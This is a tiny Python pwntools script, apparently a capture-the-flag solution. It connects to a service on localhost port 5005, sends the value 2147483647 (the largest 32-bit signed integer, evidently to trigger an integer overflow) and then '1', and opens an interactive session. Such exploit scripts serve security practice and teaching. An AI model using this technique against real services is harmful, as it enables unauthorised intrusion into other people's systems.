from pwn import *


p=remote("localhost",5005)
#p=process("./main")

p.sendline("2147483647")

p.sendline("1")


p.interactive()